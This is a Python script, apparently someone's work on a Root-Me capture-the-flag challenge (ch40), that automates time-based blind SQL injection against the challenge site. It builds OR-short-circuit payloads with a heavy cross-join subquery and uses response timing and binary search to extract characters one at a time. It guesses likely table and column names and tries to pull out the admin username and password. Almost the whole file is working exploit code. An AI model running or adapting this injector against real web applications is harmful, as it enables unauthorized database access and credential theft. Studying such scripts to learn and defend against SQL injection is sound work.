#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 25 - PROBAR CON COLUMNA username
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        self.heavy = "(SELECT COUNT(*) FROM users, users T1)"
        self.technique = "1 OR ({cond}) OR {heavy}"  # OR cortocircuito
        
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition):
        payload = self.technique.format(cond=condition, heavy=self.heavy)
        t = self.test_payload(payload, repeats=2)
        return t > self.threshold
    
    def extract_char(self, query, pos):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
            if self.is_true(cond):
                low = mid + 1
            else:
                high = mid - 1
        return chr(low)
    
    def extract_string(self, query, label="Extrayendo", max_len=50):
        print(f"\n[*] {label}...")
        result = ""
        for pos in range(1, max_len + 1):
            char = self.extract_char(query, pos)
            result += char
            print(f"  [{pos}] '{char}' (ASCII: {ord(char)})")
            if ord(char) == 0 or ord(char) == 32:
                break
        return result
    
    def verify_user(self, tabla, columna, usuario_esperado):
        """Verifica si un usuario existe en la tabla"""
        query = f"SELECT {columna} FROM {tabla} WHERE {columna}='{usuario_esperado}'"
        return self.is_true(f"EXISTS({query})")

# EJECUCIÓN
injector = TimeBasedSQLInjector()

print("="*70)
print("  PROBANDO CON COLUMNA USERNAME")
print("="*70)

# 1. Probar diferentes tablas con columna username
print("\n[1] Probando tablas con columna username:")

tablas = ['member', 'members', 'usuarios', 'users', 'admin', 'administradores', 'user', 'login']

for tabla in tablas:
    # Verificar si la columna username existe
    if injector.is_true(f"EXISTS(SELECT username FROM {tabla})"):
        print(f"  [+] Tabla con username: {tabla}")
        
        # Verificar si existe 'admin'
        if injector.verify_user(tabla, "username", "admin"):
            print(f"    ✅ ¡'admin' encontrado en {tabla}!")
            
            # Extraer el admin
            query = f"SELECT username FROM {tabla} WHERE username='admin'"
            admin = injector.extract_string(query, f"Admin de {tabla}")
            print(f"    Admin: '{admin}'")
            
            # Extraer la contraseña
            query_pass = f"SELECT password FROM {tabla} WHERE username='admin'"
            passwd = injector.extract_string(query_pass, f"Password de admin en {tabla}")
            print(f"    Password: '{passwd}'")
            
            break
        else:
            print(f"    ❌ 'admin' no encontrado en {tabla}")
    else:
        print(f"  [-] Tabla sin username: {tabla}")

# 2. Probar con columna 'user' (alternativa)
print("\n[2] Probando con columna 'user':")

for tabla in tablas:
    if injector.is_true(f"EXISTS(SELECT user FROM {tabla})"):
        print(f"  [+] Tabla con user: {tabla}")
        
        if injector.verify_user(tabla, "user", "admin"):
            print(f"    ✅ ¡'admin' encontrado en {tabla}!")
            
            query = f"SELECT user FROM {tabla} WHERE user='admin'"
            admin = injector.extract_string(query, f"Admin de {tabla}")
            print(f"    Admin: '{admin}'")
            
            query_pass = f"SELECT password FROM {tabla} WHERE user='admin'"
            passwd = injector.extract_string(query_pass, f"Password de admin en {tabla}")
            print(f"    Password: '{passwd}'")
            
            break
        else:
            print(f"    ❌ 'admin' no encontrado en {tabla}")

# 3. Probar con columna 'login'
print("\n[3] Probando con columna 'login':")

for tabla in tablas:
    if injector.is_true(f"EXISTS(SELECT login FROM {tabla})"):
        print(f"  [+] Tabla con login: {tabla}")
        
        if injector.verify_user(tabla, "login", "admin"):
            print(f"    ✅ ¡'admin' encontrado en {tabla}!")
            
            query = f"SELECT login FROM {tabla} WHERE login='admin'"
            admin = injector.extract_string(query, f"Admin de {tabla}")
            print(f"    Admin: '{admin}'")
            
            query_pass = f"SELECT password FROM {tabla} WHERE login='admin'"
            passwd = injector.extract_string(query_pass, f"Password de admin en {tabla}")
            print(f"    Password: '{passwd}'")
            
            break
        else:
            print(f"    ❌ 'admin' no encontrado en {tabla}")
